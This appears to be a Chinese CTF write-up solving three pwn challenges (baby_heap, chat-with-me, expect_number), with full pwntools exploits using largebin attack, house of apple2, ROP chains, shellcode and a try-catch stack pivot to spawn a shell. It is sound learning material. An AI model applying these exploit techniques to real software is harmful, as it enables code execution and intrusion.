# baby_heap
这个题目存在一次largebin attack, 还有一个部分地址写(题解没用到)

本次采用的方式是`largebin attack + setcontext + house of apple2`

## largebin attack
本题glibc为2.35,所以`largebin_attack`基本只能修改`victim->bk_nextsize`
其中具体流程如下:
1. 存在一个较大的堆块A已经置于largebin,且整个largebin只有这一个chunk
2. 走正常的堆块流程，使得一个较小的堆块B放置于largebin,这里就会出现较大的`chunkA->bk_nextsize->fd_nextsize = B`
3. 这里存在一个小小的trick或者说一个注意点，那就是当我们从unsortedbin里面获取一个较大的块的时候，比如说unsortedbin里面连接了一个0x521的chunk, 此时我申请获取0x510的快，此时并不会立刻切割，而是先将其中unsortedbin链接的chunk放入largebin(因为这是largebin的范围)当中,然后在largebin当中先寻找是否有恰好适合的堆块，如果没有才将其释放出去，这里的先链接的过程就已经造成了largebin attack(如果你已经将`chunkA->bk_nextsize`修改为target的话),使得`target->fd_nextsize = B`,但是如果B恰好又是即将分配出去的chunk,那么就进一步的会导致`target->fd_nextsize = A`

## setcontext
主要是利用了libc里面的这个函数，在高版本的libc当中是由rdx决定传入的参数，但是本题在`house of apple2`调用setcontex后的rdx竟然直接是`_wide_data`
```gdb
 0x782dc2e53a1d <setcontext+61>:      mov    rsp,QWORD PTR [rdx+0xa0]
 0x782dc2e53a24 <setcontext+68>:      mov    rbx,QWORD PTR [rdx+0x80]
 0x782dc2e53a2b <setcontext+75>:      mov    rbp,QWORD PTR [rdx+0x78]
 0x782dc2e53a2f <setcontext+79>:      mov    r12,QWORD PTR [rdx+0x48]
 0x782dc2e53a33 <setcontext+83>:      mov    r13,QWORD PTR [rdx+0x50]
```
## house of apple2
本题的重点，利用条件如下：
1. 能从main返回，或执行exit
2. 能泄露heap和libc地址
3. 能使用一次largebin attack

本次需要伪造的重点在于`struct _IO_wide_data`,
```c
/* Extra data for wide character streams.  */
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;    /* Start of putback+get area. */
  wchar_t *_IO_write_base;    /* Start of put area. */
  wchar_t *_IO_write_ptr;    /* Current put pointer. */
  wchar_t *_IO_write_end;    /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```
其中的`_wide_vtable`这个函数表是不会检查是否处于指定section内，因此可以在堆上面构造这样一个表

同样我们也需要构造`struct _IO_FILE`结构体,这个结构体中就有上述的`struct _IO_wide_data`这样的字段，同样将该字段伪造在堆上面
而由于

> 1. _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
2. vtable设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
3. `_wide_data`设置为可控堆地址A，即满足*(fp + 0xa0) = A
4. `_wide_data->_IO_write_base`设置为0，即满足*(A + 0x18) = 0
5. `_wide_data->_IO_buf_base`设置为0，即满足*(A + 0x30) = 0
6. `_wide_data->_wide_vtable`设置为可控堆地址B，即满足*(A + 0xe0) = B
7. `_wide_data->_wide_vtable->doallocate`设置为地址C用于劫持RIP，即满足*(B + 0x68) = C

调用链条如下
> _IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)


这里记录一个比较有趣的gadget,就是libc里面的`svcudp_reply`
```
    0x751f46b4951a <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
    0x751f46b4951e <svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
    0x751f46b49522 <svcudp_reply+34>:    lea    r13,[rbp+0x10]
    0x751f46b49526 <svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
    0x751f46b4952d <svcudp_reply+45>:    mov    rdi,r13
    0x751f46b49530 <svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
```

题目由于设置了seccomp,因此使用`openat2`来进行orw



整个题目的exp如下
```python
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
context.terminal = ['tmux','splitw','-h']

def slog(name, address): print("\033[40;34m[+]\033[40;35m" + name + "==>" +hex(address) + "\033[0m")

def debug(cmd = 0):
    if cmd == 0:
        gdb.attach(io)
    else:
        gdb.attach(io, cmd)

s   = lambda content : io.send(content)
sl  = lambda content : io.sendline(content)
sa  = lambda content,send : io.sendafter(content, send)
sla = lambda content,send : io.sendlineafter(content, send)
rc  = lambda number : io.recv(number)
ru  = lambda content : io.recvuntil(content)
rcl = lambda : io.recvline()

def add(size):
    sla("choice: \n", "1")
    sla("size \n", str(size))


def delete(index):
    sla("choice: \n", "2")
    sla("delete: \n", str(index))


def edit(index, content):
    sla("choice: \n", "3")
    sla("edit: \n", str(index))
    sa("content \n", content)


def show(index):
    sla("choice: \n", "4")
    sla("show: \n", str(index))

def secret(choice):
    sla("choice: \n", "5")
    sla("sad !\n", str(choice))

def secret_shop(addr, overwrite):
    sla("choice: \n", "6")
    sa("addr \n", p64(addr))
    sl(p64(overwrite))

io = process("./pwn")
#io = remote("59.110.159.153",20634)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

########## leak libc heap_base ############

secret(2)

add(0x520) #1
add(0x500) #2
add(0x510) #3
delete(1)
add(0x568) #4
delete(3)
show(1)
ru("here \n")
libc.addr = u64(rc(8)) - 0x21b110
slog("libc_base", libc.addr)
rc(8)
heap_base = u64(rc(8)) - 0x1950
fake_IO_addr = heap_base + 0x1950
slog("heap_base", heap_base)
############# house of cat #################

IO_list_all = libc.symbols['_IO_list_all'] + libc.addr
setcontext = libc.symbols["setcontext"] + libc.addr + 61
IO_wfile_jumps = libc.addr + 0x216f40
lock = heap_base + 0x3000

ret = libc.addr + 0x467c9
pop_rdi = libc.addr + 0x2a3e5
pop_rsi = libc.addr + 0x2be51
pop_rdx_r12 = libc.addr + 0x11f2e7
pop_rax = libc.addr + 0x45eb0
mprotect = libc.addr + libc.symbols['mprotect']

slog("_IO_list_all", IO_list_all)
slog("_IO_wfile_jumps", IO_wfile_jumps)
slog("fake_io_addr", fake_IO_addr)
slog("setcontext",setcontext)

payload  = b''
# fake io_list_all
payload += p64(0)*3 + p64(IO_list_all - 0x20)
payload += p64(0) + p64(0)*2 + p64(fake_IO_addr + 0x10)
payload += p64(0)*4
payload += p64(0)*3 + p64(lock)
payload += p64(0)*2 + p64(fake_IO_addr+0xe0) + p64(0)
payload += p64(0)*4
payload += p64(0) + p64(IO_wfile_jumps)
# fake wide_data
payload += p64(setcontext)
payload += p64(0)*(0x1b - 8)
payload += p64(heap_base + 0x1b18) + p64(ret) + p64(0)*6
payload += p64(heap_base + 0x1a30 - 0x68)   # wide_vtable
payload += p64(pop_rdi) + p64(heap_base >> 12 << 12) + p64(pop_rsi)
payload += p64(0x2000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect) + p64(heap_base + 0x1b60)
payload += asm(f'mov rax, 0x67616c66; push rax; push rsp; pop rsi; mov rdi, -0x64; mov rax, 437; mov rdx, {lock}; mov r10, 0x18; syscall;')
payload += asm(shellcraft.read(3, lock, 0x100) + shellcraft.write(1, lock, 0x100))

edit(1, payload)
#debug("b *$rebase(0x1ea7)")
#secret_shop(heap_base + 0x1f3110,io_list_all_addr-0x20)
add(0x500) #5 no precise
sla("choice: \n", str(3))
io.interactive()
```

# chat-with-me
根据出题人来讲[https://www.ctfiot.com/213624.html](https://www.ctfiot.com/213624.html)，本次的题目删除符号不给源码是为了集中精力到动调上
rust 菜单题, 没有符号表，利用动态调试

题目开始是初始化了堆部分
## ADD

```gdb
pwndbg> bins
tcachebins
0x20 [  1]: 0x5555555bab80 ◂— 0
0x30 [  2]: 0x5555555baae0 —▸ 0x5555555baa10 ◂— 0
0x80 [  1]: 0x5555555ba480 ◂— 0
0xa0 [  1]: 0x5555555baa40 ◂— 0
0x100 [  1]: 0x5555555ba910 ◂— 0
0x1e0 [  1]: 0x5555555ba2a0 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
```

进行一次ADD操作后，堆出现变化
```gdb
pwndbg> bins
tcachebins
0x20 [  1]: 0x5555555bab80 ◂— 0
0x30 [  1]: 0x5555555baa10 ◂— 0
0x80 [  1]: 0x5555555ba480 ◂— 0
0xa0 [  1]: 0x5555555baa40 ◂— 0
0x100 [  1]: 0x5555555ba910 ◂— 0
0x1e0 [  1]: 0x5555555ba2a0 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
```

堆块分配的顺序如下:
chunk = malloc(8)
free(chunk)
chunk = malloc(6)  //存放字符串
free(chunk)



## SHOW
发现可以查看刚刚ADD的堆块
```sh
Index > 0
Content: [2, 0, 0, 0, 0, 0, 0, 0, 176, 203, 91, 85, 85, 85, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 232, 217, 255, 255, 255, 127, 0, 0, 176, 117, 91, 85, 85, 85, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 176, 203, 91, 85, 85, 85, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0]
```


发现这里泄漏了堆地址、栈地址、elf基地址
堆块分配的顺序如下：
chunk1 = malloc(8)
chunk2 = malloc(5)
free(chunk2)
// 选择index
chunk3 = malloc(8)
free(chunk3)
free(chunk1)
chunk4 = malloc(6) #choice
free(chunk4)

## EDIT

chunk1 = malloc(8) 
chunk2 = malloc(5)  #index
free(chunk2)
chunk3 = malloc(8)
chunk4 = malloc(7) #content
free(chunk4)
free(chunk3)     #
free(chunk1)

chunk5 = malloc(6) #choice

使用cyclic来进行输入发现出现崩溃, 如果开启了转储文件选项`ulimit -c`
那么就可以使用`coredumpctl dump `来分析转储文件, 可以分析到当输入偏移超过0x20的部分将会被释放，那么这里就存在一个任意释放的漏洞


而由于在堆空间中我们能看到一个堆块里面存放的是栈的信息
```gdb

0x5555555baad0  0x0000000000000000      0x0000000000000031      ........1.......
0x5555555baae0  0x00007fffffffd7d0      0x0000000000000000      ................
0x5555555baaf0  0x0000000000000000      0x0000000000000000      ................
0x5555555bab00  0x0000000000000000      0x0000000000000041      ........A.......
```

在调试过程中发现每次add都会加入一项，但这里出现的情况就是每一项是同样的栈变量,而分析show函数在打印每个堆块都是一致的，
那么不难怀疑这个部分是和堆块信息有点关联

在后续的调试中可发现，当不断add的时候，将会出发realloc重新扩大该堆块，因此我们完全可以首先在堆中伪造一个大块然后释放他到unsortedbin(这里释放到unsort是因为realloc不会简单从tcache获取新堆块，而是从unsortedbin)

那么如何构造堆块呢,我们可以通过随机输入字符串，然后判断该字符串在heap区域的分布，这里发现存在一个0x2010大小的堆块专门用于存放输入的edit值，因此就可以通过他来伪造堆块并释放，然后劫持栈变量

```gdb

0x5555555bab90: 0x0000000000000000      0x0000000000002011
0x5555555baba0: 0x0000000000000a31      0x0000000000000000
0x5555555babb0: 0x0000000000000000      0x0000000000000000
```

最后任意写返回值进行ROP即可
```py

#!/usr/bin/env python3

from pwn import *
import ast
# from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "splitw", "-h"]

s = lambda content: io.send(content)
sl = lambda content: io.sendline(content)
sa = lambda content, send: io.sendafter(content, send)
sla = lambda content, send: io.sendlineafter(content, send)
rc = lambda number: io.recv(number)
ru = lambda content: io.recvuntil(content)


def slog(name, address):
    print("\033[40;31m[+]\033[40;35m" + name + "==>" + hex(address) + "\033[0m")


def debug(content=""):
    if content == "":
        gdb.attach(io)
    else:
        gdb.attach(io, content)


def get_address():
    return u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))


def add():
    sla("Choice > ", "1")


def delete(idx):
    sla("Choice > ", "4")
    sla("Index > ", str(idx))


def exit():
    sla("Choice > ", "5")


def bytes2array(array):
    string_data = array.decode("utf-8")
    try:
        normal_list = ast.literal_eval(string_data)
        # print("解析后的列表:")
        # print(normal_list)
        # print(f"列表的长度是: {len(normal_list)}")
        if len(normal_list) % 8 != 0:
            print("列表不是8的倍数")
        else:
            hex_list = []
            for i in range(0, len(normal_list), 8):
                chunk = normal_list[i : i + 8]
                byte_chunk = bytes(chunk)
                integer_value = int.from_bytes(byte_chunk, "little")
                hex_list.append(hex(integer_value))
            print(hex_list)
            return hex_list
    except (ValueError, SyntaxError) as e:
        print(f"解析出错: {e}")


def edit(idx, content):
    sla("Choice > ", "3")
    sla("Index > ", str(idx))
    sa("Content > ", content)
    ru("Content: ")
    return bytes2array(ru("]"))


def show(idx):
    sla("Choice > ", "2")
    sla("Index > ", str(idx))
    ru("Content: ")
    return bytes2array(ru("]"))


io = process("./pwn", "RUST_BACKTRACE=1")
add()  # 0
normal_list = show(0)
heap_base = int(normal_list[1], 16)
stack_addr = int(normal_list[4], 16)
elf.address = int(normal_list[5], 16) - 0x635B0
slog("heap_base", heap_base)
slog("stack_addr", stack_addr)
slog("elf address", elf.address)
# debug()
# payload = (
#     b"\x" * 0x20 + p64(heap_base + 0xBD0) + p64(0x51) + b"\x00" * 0x58 + p64(0x51)
#     # + b"\x00" * 0x50
#     # + p64(0x50)
#     # + p64(0x60)
# )
payload = p64(1) + p64(0x91) + p64(1) * 2 + p64(heap_base - 0x2010 + 0x30) + p64(0x1FE1)
edit(0, payload)

for _ in range(6):
    add()


def arbtrary_write(address, content):
    payload = p64(0) * 5 + p64(0x51) + p64(address)
    edit(1, payload)
    edit(0, content)


def rop_construct(address, content):
    for i in range(0, len(content), 8):
        arbtrary_write(address + i, content[i : i + 8])


ret = 0x16BD8 + elf.address
pop_rdi_rbp_ret = elf.address + 0x1DD45
syscall = elf.address + 0x26FCF
pop_rax_ret = elf.address + 0x16F3E
pop_rsi_rbp_ret = elf.address + 0x1E032
mov_rdx_rdi_18_rax_rdi_10_ret = elf.address + 0x4E906


target_addr = stack_addr + 0x3D0

payload = (
    p64(ret)
    + p64(pop_rdi_rbp_ret)
    + p64(target_addr + 0x18)
    + p64(0)
    + p64(pop_rsi_rbp_ret)
)
payload += (
    p64(0) + p64(0) + p64(mov_rdx_rdi_18_rax_rdi_10_ret) + p64(pop_rax_ret) + p64(59)
)
payload += p64(pop_rdi_rbp_ret) + p64(target_addr + 0x70) + p64(0)
payload += p64(syscall) + b"/bin/sh\x00"

rop_construct(target_addr, payload)
slog("target_addr", target_addr)

pause()
exit()

io.interactive()
```


## expect_number

```sh
Hello!
Let's play a game!
This game has 288 rounds.
Initially, your number is 0. You can choose 0,1 or 2.
 But I won't tell you how I did the calculations. 
But, if you make the number equal to 0x4F5DA2, I will give you the gift.
|----------------------------|
|  1. continue the game      |
|  2. show                   |
|  3. submit                 |
|  4. Exit                   |
|----------------------------|
>> waiting for your choice 
```

main函数设置了随机种子
```cpp
__int64 sub_266A()
{
  __int64 result; // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  time(0LL);
  srand(1u);
  std::operator<<<std::char_traits<char>>(&std::cout, "Hello!");
  std::ostream::operator<<();
  std::operator<<<std::char_traits<char>>(&std::cout, "Let's play a game!");
  std::ostream::operator<<();
  std::operator<<<std::char_traits<char>>(&std::cout, "This game has 288 rounds.");
  std::ostream::operator<<();
  std::operator<<<std::char_traits<char>>(&std::cout, "Initially, your number is 0. You can choose 0,1 or 2.");
  std::ostream::operator<<();
  std::operator<<<std::char_traits<char>>(&std::cout, " But I won't tell you how I did the calculations. ");
  std::ostream::operator<<();
  std::operator<<<std::char_traits<char>>(
    &std::cout,
    "But, if you make the number equal to 0x4F5DA2, I will give you the gift.");
  result = std::ostream::operator<<();
  dword_5408 = 0;
  return result;
}

```
这里发现为固定的1

### continue the game
```cpp
unsigned __int64 __fastcall continue_the_game(__int64 a1, MyStruct *a2, __int64 a3)
{
  __int8 v3; // cl
  int chose_num; // [rsp+2Ch] [rbp-14h] BYREF
  int v7; // [rsp+30h] [rbp-10h]
  int rand_num; // [rsp+34h] [rbp-Ch]
  unsigned __int64 canary; // [rsp+38h] [rbp-8h]

  canary = __readfsqword(0x28u);
  if ( a2->nr <= 0x120 )
  {
    chose_num = 0;
    rand_num = rand() % 4 + 1;
    std::operator<<<std::char_traits<char>>(&std::cout, ">> Which one do you choose? 2 or 1 or 0");
    std::ostream::operator<<();
    std::istream::operator>>(&std::cin, &chose_num);
    number_check(a1, chose_num);
    v7 = a2->num[a2->nr];
    if ( rand_num == 4 )
    {
      if ( !chose_num )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "Divisor cannot be 0!");
        std::ostream::operator<<();
        exit(-1);
      }
      if ( v7 % chose_num )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "It's not divisible!");
        std::ostream::operator<<();
        exit(-1);
      }
      v7 /= chose_num;
    }
    else if ( rand_num <= 4 )
    {
      switch ( rand_num )
      {
        case 3:
          v7 *= chose_num;
          break;
        case 1:
          v7 += chose_num;
          break;
        case 2:
          v7 -= chose_num;
          break;
      }
    }
    sub_2B94(a3, v7);
    a2->num[a2->nr] = chose_num + 48;
    v3 = v7;
    a2->num[++a2->nr] = v3;
  }
  else
  {
    std::operator<<<std::char_traits<char>>(
      &std::cout,
      "The number of games has expired and I cannot continue playing with you");
    std::ostream::operator<<();
  }
  return canary - __readfsqword(0x28u);
}
```
分析程序流程

1. 输入1, 代表进入该流程
2. 检查参数a2->nr 是否大于0x120，这里的结构体可以通过查看汇编稍微逆向出来
```cpp
00000000 struct MyStruct // sizeof=0x10;variable_size
00000000 {
00000000     __int64 magic;
00000008     int nr;
0000000C     __int8 num[];
0000000C     // padding byte
0000000D     // padding byte
0000000E     // padding byte
0000000F     // padding byte
00000010 };
```
3. rand_num 通过操作变为1~4的一个值, 此时输入选择值
4. v7为数组num当前nr下标所对应的值
5. 如果rand_num为4, 则判断选择的值，此时不能为0同时也不能为1
6. 通过上述检查则v7除以对应chose_num, 此时v7/= chose_num
7. 如果rand_num 为1 ,则v7 += chose_num
8. 如果rand_num 为2，则v7 -= chose_num 
9. 如果rand_num 为3, 则v7 *= chose_num
10. 结束上面的操作，此时判断如果v7 >= 0x101 则异常退出, 这里需要注意，al本来存放的是v7, 此时由于movsx这个操作进行了符号位扩展，所以如果v7 > 0x80 则可能就会使得程序通过不了该判断，感觉这里是一个编译的问题
    ```ida
    0x5609f5cd5cd5    movsx  eax, al                             EAX => 0xffffffa0
    0x5609f5cd5cd8    mov    dword ptr [rbp - 0x10], eax         [0x7ffc3dd25b20] <= 0x
    ```
11. 将原来的num[nr]写入选择的chose_num + 48
12. 将修改后的v7 写入 a2->num[++a2->nr]

### show
查看a2->num的内容，这里是以char数组的形式打印

### submit
查看a1->num[a1->nr] 是否等于0xa2


得知上面的内容后就可以编写exp,只需要满足最后得到的值为0xa0即可
```py

#!/usr/bin/env python3

from pwn import *
from ctypes import *
import ast
# from LibcSearcher import *

context(arch="amd64", os="linux", log_level="info")
context.terminal = ["tmux", "splitw", "-h"]

s = lambda content: io.send(content)
sl = lambda content: io.sendline(content)
sa = lambda content, send: io.sendafter(content, send)
sla = lambda content, send: io.sendlineafter(content, send)
rc = lambda number: io.recv(number)
ru = lambda content: io.recvuntil(content)


def slog(name, address):
    print("\033[40;31m[+]\033[40;35m" + name + "==>" + hex(address) + "\033[0m")


def debug(content=""):
    if content == "":
        gdb.attach(io)
    else:
        gdb.attach(io, content)


def get_address():
    return u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))


io = process("./expect_number")


def cont_the_game(choice):
    sla("choice \n", "1")
    randnum = elf.rand() % 4 + 1
    if randnum == 4:
        choice = 1
    sla("or 0", str(choice))


sum = 0


def count_game(choice):
    global sum
    sla("choice \n", "1")
    randnum = elf.rand() % 4 + 1
    if randnum == 4:
        sum /= choice
        print(f"randnum: {randnum}, div, sum, {sum}")
    elif randnum == 1:
        sum += choice
        print(f"randnum: {randnum}, add, sum, {sum}")
    elif randnum == 2:
        sum -= choice
        print(f"randnum: {randnum}, minus, sum, {sum}")
    elif randnum == 3:
        sum *= choice
        print(f"randnum: {randnum}, mult, sum, {sum}")
    sla("or 0", str(choice))


def show():
    sla("choice \n", "2")


def submit():
    sla("choice \n", "3")


elf = cdll.LoadLibrary("/usr/lib/libc.so.6")
elf.srand(1)

for i in range(7):
    cont_the_game(0)

count_game(2)  # add, sum, 2
count_game(0)  # minus, sum, 2
count_game(0)  # minus, sum, 2
count_game(2)  # mult, sum, 4
count_game(1)  # div, sum, 4.0
count_game(2)  # mult, sum, 8.0
count_game(1)  # div, sum, 8.0
count_game(1)  # div, sum, 8.0
count_game(2)  # mult, sum, 16.0
count_game(2)  # add, sum, 18.0
count_game(2)  # mult, sum, 36.0
count_game(2)  # add, sum, 38.0
count_game(2)  # add, sum, 40.0
count_game(1)  # div, sum, 40.0
count_game(2)  # add, sum, 42.0
count_game(1)  # div
count_game(1)  # minus
# debug("b *$rebase(0x2b94)")
count_game(2)  # mult
count_game(1)  # mult
count_game(1)  # div
count_game(1)  # div
count_game(1)  # div
count_game(1)  # div
count_game(1)  # minus
count_game(2)  # mult

submit()

io.interactive()
```

结果写完了网上搜索发现这里`cat gift `是无效的，本题真正的考点是try-catch栈迁移


查看
`.init_array`: 
```segment
.init_array:0000000000004C08 ; ELF Initialization Function Table
.init_array:0000000000004C08 ; ===========================================================================
.init_array:0000000000004C08
.init_array:0000000000004C08 ; Segment type: Pure data
.init_array:0000000000004C08 ; Segment permissions: Read/Write
.init_array:0000000000004C08 _init_array     segment qword public 'DATA' use64
.init_array:0000000000004C08                 assume cs:_init_array
.init_array:0000000000004C08                 ;org 4C08h
.init_array:0000000000004C08 off_4C08        dq offset sub_23A0      ; DATA XREF: LOAD:0000000000000168↑o
.init_array:0000000000004C08                                         ; LOAD:00000000000002F0↑o
.init_array:0000000000004C10                 dq offset sub_292C
.init_array:0000000000004C10 _init_array     ends
```

`.fini_array`:
```segment
.fini_array:0000000000004C18 ; ELF Termination Function Table
.fini_array:0000000000004C18 ; ===========================================================================
.fini_array:0000000000004C18
.fini_array:0000000000004C18 ; Segment type: Pure data
.fini_array:0000000000004C18 ; Segment permissions: Read/Write
.fini_array:0000000000004C18 _fini_array     segment qword public 'DATA' use64
.fini_array:0000000000004C18                 assume cs:_fini_array
.fini_array:0000000000004C18                 ;org 4C18h
.fini_array:0000000000004C18                 dq offset sub_2360
.fini_array:0000000000004C18 _fini_array     ends
.fini_array:0000000000004C18
```


### exit
```cpp
    while ( 1 )
    {
      menu();
      choice = getNum();
      if ( choice != 4 )
        break;
      (**(void (__fastcall ***)(void *))seg_5010)(seg_5010);
    }
```

在主程序的菜单中如果输入为4那么走路径Exit
而seg_5010被初始化为
```ida
.data:0000000000005010 seg_5010        dq 5520h               
```

而5520在init_array里面被赋值为函数
```ida
void __noreturn pgoodbye_exit()
{
  std::operator<<<std::char_traits<char>>(&std::cout, "Good bye!");
  std::ostream::operator<<();
  exit(0);
}
```
这个函数明显没什么用，在init_array里面同时也赋值给了其他变量函数值，其中有一个存在明显bug
```ida
unsigned __int64 vuln_func()
{
  std::runtime_error *exception; // rbx
  char buf[8]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  std::operator<<<std::char_traits<char>>(&std::cout, "Tell me your favorite number.");
  std::ostream::operator<<();
  if ( read(0, buf, 0x30uLL) > 8 )
  {
    exception = (std::runtime_error *)__cxa_allocate_exception(0x10uLL);
    std::runtime_error::runtime_error(exception, "Input too long");
    __cxa_throw(
      exception,
      (struct type_info *)&`typeinfo for'std::runtime_error,
      (void (__fastcall *)(void *))&std::runtime_error::~runtime_error);
  }
  return v3 - __readfsqword(0x28u);
}
```
发现存在明显的溢出
而整个程序流程中没有任何函数主动调用该漏洞程序，那么就需要我们自行控制流程执行到该漏洞函数
而在我们输入`choice_number`的时候会将内容通过计算存放在  `off_5400` 这里，且该结构体范围为0x12c,
那么刚好就可以直接溢出到 `off_5520` 这个变量



修改的字节为从偏移`4c48`修改为`4c60`

修改完后使用trycatch的unwind机制控制执行流，
在throw出异常的时候程序会调用原来rbp+8处存放的ret来查看栈帧是否存有相应的catch,如果有则调用其中的异常处理

在代码中搜索字符串`/bin/sh`可以找到有一块catch的异常处理是`system('/bin/sh')`,因此我们只需要修改其中的ret即可，但这里需要注意rbp不能是无意义字符串，这里我写入的是bss的值
至于程序的基地址可以通过上面0x5520偏移原来保存的地址来泄漏

整体exp如下:
```py
#!/usr/bin/env python3

from pwn import *
from ctypes import *
import ast
# from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
# context.terminal = ["kitty"]
context.terminal = ["tmux", "splitw", "-h"]

s = lambda content: io.send(content)
sl = lambda content: io.sendline(content)
sa = lambda content, send: io.sendafter(content, send)
sla = lambda content, send: io.sendlineafter(content, send)
rc = lambda number: io.recv(number)
ru = lambda content: io.recvuntil(content)


def slog(name, address):
    print("\033[40;31m[+]\033[40;35m" + name + "==>" + hex(address) + "\033[0m")


def debug(content=""):
    if content == "":
        gdb.attach(io)
    else:
        gdb.attach(io, content)


def get_address():
    return u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))


io = process("./expect_number")


def cont_the_game(choice):
    sla("choice \n", "1")
    randnum = elf.rand() % 4 + 1
    if randnum == 4:
        choice = 1
    elif randnum == 1:
        choice = 0
    elif randnum == 2:
        choice = 0
    elif randnum == 3:
        choice = 1

    sla("or 0", str(choice))


sum = 0


def count_game(choice):
    global sum
    sla("choice \n", "1")
    randnum = elf.rand() % 4 + 1
    if randnum == 4:
        sum /= choice
        print(f"randnum: {randnum}, div, sum, {sum}")
    elif randnum == 1:
        sum += choice
        print(f"randnum: {randnum}, add, sum, {sum}")
    elif randnum == 2:
        sum -= choice
        print(f"randnum: {randnum}, minus, sum, {sum}")
    elif randnum == 3:
        sum *= choice
        print(f"randnum: {randnum}, mult, sum, {sum}")
    sla("or 0", str(choice))


def show():
    sla("choice \n", "2")


def submit():
    sla("choice \n", "3")


def gift():
    sla("choice \n", "4")


elf = cdll.LoadLibrary("/usr/lib/libc.so.6")


def run():
    elf.srand(1)

    # debug("b *$rebase(0x2b94)")
    for i in range(7):
        cont_the_game(0)

    count_game(2)  # add, sum, 2
    count_game(0)  # minus, sum, 2
    count_game(0)  # minus, sum, 2
    count_game(2)  # mult, sum, 4
    count_game(1)  # div, sum, 4.0
    count_game(2)  # mult, sum, 8.0
    count_game(1)  # div, sum, 8.0
    count_game(1)  # div, sum, 8.0
    count_game(2)  # mult, sum, 16.0
    count_game(2)  # add, sum, 18.0
    count_game(1)  # mult, sum, 18
    count_game(2)  # add, sum, 20
    count_game(2)  # add, sum, 22
    count_game(1)  # div, sum, 22
    count_game(2)  # add, sum, 24
    count_game(1)  # div, sum, 24
    count_game(0)  # minus, sum, 24
    count_game(2)  # mult 48
    count_game(2)  # mult 96

    # debug("b *$rebase(0x24e1)")
    # debug("b *$rebase(0x29e7)")
    for i in range(0x120 - 39):
        cont_the_game(0)

    # debug("b *$rebase(0x2bee)")
    show()
    ru("\x60")
    elf.address = u64(rc(6).ljust(8, b"\x00")) - 0x4C48
    slog("elf_address", elf.address)
    cont_the_game(0)

    gift()
    # payload = b"a" * 0x28 + b"\x16\x55"
    payload = b"a" * 0x20 + p64(elf.address + 0x5080) + b"\x16\x85"
    sa("number.", payload)

if __name__ == "__main__":
    while True:
        try:
            run()
            print("main() 成功，退出。")
            break
        except EOFError:
            print("[!] 程序结束（EOF），重启中...")
        # except Exception as e:
        #     print(f"执行失败: {e}，重试中...\n")

    io.interactive()
```


